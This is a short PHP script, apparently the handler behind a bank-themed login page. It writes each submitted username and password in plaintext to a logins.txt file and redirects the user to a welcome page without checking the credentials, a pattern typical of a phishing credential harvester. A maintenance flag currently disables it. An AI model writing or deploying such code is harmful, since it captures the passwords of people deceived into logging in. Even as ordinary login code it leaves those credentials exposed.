<?php
  $isUnderMaintenance = true; // Change to false when the maintenance is over
  if ($isUnderMaintenance) {
      echo "Currently unavailable. Please check back later.";
  } else {
      // Get the username and password from the form data
      $username = $_POST["username"];
      $password = $_POST["password"];

      // Set the path for the logins.txt file
      $loginsFilePath = "/home/ec2-user/bank/logins.txt";

      // Open the file for appending
      $file = fopen("logins.txt", "a");

      // Write the login information to the file
      fwrite($file, "Username: $username\nPassword: $password\n\n");

      // Close the file
      fclose($file);

      // Redirect the user back to the login page
      header("Location: welcome.html");
  }
?>

